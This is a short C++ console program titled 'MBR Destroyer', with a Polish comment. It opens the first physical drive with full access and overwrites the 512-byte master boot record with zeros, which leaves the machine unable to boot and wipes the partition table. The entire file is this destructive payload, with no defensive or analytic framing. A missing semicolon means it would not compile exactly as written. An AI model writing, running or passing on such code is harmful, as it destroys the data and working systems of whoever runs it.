// MBR Destroyer.cpp : Defines the entry point for the console application.
//

#include <Windows.h>
#include <iostream>

int main()
{
	DWORD write;
	char mbrData[512]; //rozmiar mbr

	ZeroMemory(&mbrData, (sizeof mbrData));

	HANDLE MasterBootRecord = CreateFile("\\\\.\\PhysicalDrive0",
		GENERIC_ALL, FILE_SHARE_READ | FILE_SHARE_WRITE
		, NULL, OPEN_EXISTING, NULL, NULL)
		WriteFile(MasterBootRecord, mbrData, 512, &write, NULL);
		
	CloseHandle(MasterBootRecord);

	return EXIT_SUCCESS;


}

